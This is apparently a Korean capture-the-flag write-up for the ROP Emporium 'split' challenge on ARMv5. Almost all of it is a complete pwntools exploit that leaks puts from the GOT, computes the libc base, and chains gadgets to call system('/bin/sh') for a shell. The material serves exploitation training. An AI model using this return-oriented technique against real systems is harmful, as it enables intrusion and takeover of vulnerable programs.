ROP Emporium split_armv5
===================

익스플로잇 과정 자체는 arm64와 같다.

arm 때문인지 가젯 구하는데에 ROPgadget도 ropper도 안먹혀서 다른 라이트업을 참고했다. > https://github.com/0xSoEasY/ROPemporium/blob/master/ARMv5/1-split/solve.py     
(이건 주소 하드코딩한 방식이라 오프셋만 참고했다) 

```python
#!/usr/bin/env python3
from pwn import *

FILE = "./split_armv5"  
LIBC_FILE = "./libc.so.6"

context.os = "linux"
context.arch = "arm"
context.binary = FILE

elf = ELF(FILE)
libc = ELF(LIBC_FILE)

p = process(['qemu-arm', '-L', '/usr/arm-linux-gnueabi', FILE])
e= ELF(FILE)

OFFSET = 36 
PADDING = p32(0xDEADBEEF) 

POP_R3_PC = 0x103a4            
MOV_R0_R3_POP_FP_PC = 0x10558 

PUTS_PLT = elf.plt['puts']
PUTS_GOT = elf.got['puts']
MAIN_ADDR = elf.symbols['main'] 

LIBC_PUTS_OFFSET = libc.symbols['puts']
LIBC_SYSTEM_OFFSET = libc.symbols['system']
LIBC_BINSH_OFFSET = next(libc.search(b'/bin/sh\x00'))

rop_stage1 = b"A" * OFFSET
rop_stage1 += p32(POP_R3_PC)
rop_stage1 += p32(PUTS_GOT)             
rop_stage1 += p32(MOV_R0_R3_POP_FP_PC)  
rop_stage1 += PADDING                   
rop_stage1 += p32(PUTS_PLT)             
rop_stage1 += p32(MAIN_ADDR)            

p.sendlineafter(b'> ', rop_stage1)

p.recvline() 

leaked_puts_raw = p.recvuntil(b'\n', drop=True)
leaked_puts_data = leaked_puts_raw[:4].ljust(4, b'\x00')
leaked_puts = u32(leaked_puts_data)

libc_base = leaked_puts - LIBC_PUTS_OFFSET
system_addr = libc_base + LIBC_SYSTEM_OFFSET
bin_sh_addr = libc_base + LIBC_BINSH_OFFSET

log.info(f"Libc base address: {hex(libc_base)}")
log.info(f"Calculated 'system' address: {hex(system_addr)}")
log.info(f"Calculated '/bin/sh' address: {hex(bin_sh_addr)}")

rop_stage2 = b"A" * OFFSET
rop_stage2 += p32(POP_R3_PC)
rop_stage2 += p32(bin_sh_addr)          
rop_stage2 += p32(MOV_R0_R3_POP_FP_PC)  
rop_stage2 += PADDING                  
rop_stage2 += p32(system_addr)         

p.sendline(rop_stage2)

p.interactive()
```



